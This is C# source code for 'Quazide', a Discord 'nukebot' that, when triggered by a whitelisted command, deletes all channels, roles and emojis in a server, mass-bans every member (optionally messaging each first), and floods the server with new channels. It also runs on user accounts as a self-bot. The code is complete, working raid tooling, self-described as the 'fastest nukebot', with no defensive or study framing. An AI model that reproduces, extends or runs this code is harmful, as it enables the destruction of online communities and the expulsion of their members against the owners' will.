using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;

namespace Quazide
{
	public static class Bot
	{
		public static Config Config { get; set; }
		public static DiscordSocketClient Client { get; private set; }
		public static bool BotAccount { get; private set; }
    
		public static void Login()
		{
			Bot._guilds = new List<ulong>();
			Bot.Client = new DiscordSocketClient();
			Bot.Client.OnJoinedGuild += delegate(DiscordSocketClient client, GuildEventArgs args)
			{
				Bot._guilds.Add(args.Guild.Id);
			};
			Bot.Client.OnLoggedIn += Bot.OnLoggedIn;
			Bot.Client.OnMessageReceived += Bot.OnMessageReceived;
			Bot.Client.Login(Bot.Config.Token);
			while (!Bot.Client.LoggedIn)
			{
				Thread.Sleep(50);
			}
			Bot.BotAccount = (Bot.Client.User.Type == UserType.Bot);
			Console.Title = string.Format("Quazide - By iLinked | Account: {0}{1}", Bot.Client.User, Bot.BotAccount ? " [BOT]" : "") + (Bot.Config.UseCommand ? (" | Nuke command: " + Bot.Config.Prefix + Bot.Config.Command) : "");
		}
		private static void OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
		{
			if (Bot.Config.CmdWhitelist.Contains(args.Message.Author.User.Id) && args.Message.GuildId != null && Bot._guilds.Contains(args.Message.GuildId.Value))
			{
				string[] splitted = args.Message.Content.Split(new char[]
				{
					' '
				});
				if (splitted[0] == Bot.Config.Prefix + Bot.Config.Command)
				{
					Task.Run(delegate()
					{
						Bot.NukeGuild(args.Message.GuildId.Value, (splitted.Length > 1 && Bot.BotAccount) ? string.Join(" ", splitted).Replace(splitted[0], "") : "");
					});
					EmbedMaker embedMaker = new EmbedMaker
					{
						Title = "Quazide",
						Description = "Fastest nukebot out there lmao",
						Color = Color.FromArgb(255, 20, 147),
						TitleUrl = "https://youtube.com/iLinked",
						ImageUrl = "https://cdn.discordapp.com/attachments/614090501381029890/614902855756808212/quazide_banner.png",
						ThumbnailUrl = "https://cdn.discordapp.com/attachments/614090501381029890/614903070232674335/AnarchyTeam.jpg"
					};
					embedMaker.Footer.Text = "Made by iLinked";
					embedMaker.Footer.IconUrl = "https://proxy.duckduckgo.com/iu/?u=https%3A%2F%2Fyt3.ggpht.com%2Fa-%2FAN66SAzUNiHgXgbUjG8fqdAbnapic3lpmlLpgjyz8A%3Ds900-mo-c-c0xffffffff-rj-k-no&f=1";
					client.SendMessage(args.Message.ChannelId, "Nuker has started.", false, embedMaker);
				}
			}
		}
		private static void OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
		{
			Bot.Config.CmdWhitelist.Add(client.User.Id);
			if (args.User.Type == UserType.User)
			{
				foreach (SocketGuild socketGuild in args.Guilds)
				{
					Bot._guilds.Add(socketGuild.Id);
				}
			}
		}
		public static void NukeGuild(ulong guildId, string dm)
		{
			if (!Bot._guilds.Contains(guildId))
			{
				Console.WriteLine("Guild was not found in the client's cached storage. Please try again");
				Console.ReadLine();
				return;
			}
			Guild guild = Bot.Client.GetGuild(guildId);
			Console.WriteLine("Nuking " + guild.Name + "...");
			Console.WriteLine("Deleting channels...");
			foreach (GuildChannel guildChannel in guild.GetChannels())
			{
				for (;;)
				{
					try
					{
						guildChannel.Delete();
						Console.WriteLine("Deleted channel " + guildChannel.Name);
					}
					catch (RateLimitException ex)
					{
						Thread.Sleep((int)ex.RetryAfter);
						continue;
					}
					catch
					{
						Console.WriteLine("Failed to delete channel " + guildChannel.Name);
					}
					break;
				}
			}
			Console.WriteLine("Banning members...");
			Parallel.ForEach<GuildMember>(Bot.Client.GetAllGuildMembers(guildId), new ParallelOptions
			{
				MaxDegreeOfParallelism = 4
			}, delegate(GuildMember member)
			{
				for (;;)
				{
					try
					{
						if (!string.IsNullOrWhiteSpace(dm))
						{
							try
							{
								Bot.Client.CreateDM(member.User.Id).SendMessage(dm, false, null);
								Console.WriteLine(string.Format("DMed {0}", member.User));
							}
							catch
							{
								Console.WriteLine(string.Format("Failed to DM {0}", member.User));
							}
						}
						member.Ban("Quazide gang", 7U);
						Console.WriteLine(string.Format("Banned {0}", member.User));
					}
					catch (RateLimitException ex4)
					{
						Thread.Sleep((int)ex4.RetryAfter);
						continue;
					}
					catch
					{
						Console.WriteLine(string.Format("Failed to ban {0}", member.User));
					}
					break;
				}
			});
			Console.WriteLine("Deleting roles...");
			foreach (Role role in guild.Roles)
			{
				for (;;)
				{
					try
					{
						role.Delete();
						Console.WriteLine("Deleted role " + role.Name);
					}
					catch (RateLimitException ex2)
					{
						Thread.Sleep((int)ex2.RetryAfter);
						continue;
					}
					catch
					{
					}
					break;
				}
			}
			Console.WriteLine("Deleting emojis...");
			foreach (Emoji emoji in guild.Emojis)
			{
				for (;;)
				{
					try
					{
						emoji.Delete();
						Console.WriteLine("Deleted emoji " + emoji.Name);
					}
					catch (RateLimitException ex3)
					{
						Thread.Sleep((int)ex3.RetryAfter);
						continue;
					}
					catch
					{
					}
					break;
				}
			}
			List<ChannelType> list = new List<ChannelType>
			{
				ChannelType.Text,
				ChannelType.Voice,
				ChannelType.Category
			};
			int num = 0;
			for (int i = 0; i < Bot.Config.CreateChannelsAmount; i++)
			{
				try
				{
					guild.CreateChannel(Bot.Config.CreateChannelsName, list[num], null);
					num++;
					if (num == list.Count)
					{
						num = 0;
					}
					Console.WriteLine(string.Format("Created channel {0}", i + 1));
				}
				catch
				{
					Console.WriteLine(string.Format("Failed to create channel {0}", i + 1));
				}
			}
			Console.WriteLine("Finished nuking " + guild.Name);
		}
		public static void NukeGuild(string dm)
		{
			foreach (ulong guildId in Bot._guilds)
			{
				Bot.NukeGuild(guildId, dm);
			}
		}
		private static List<ulong> _guilds;
	}
}
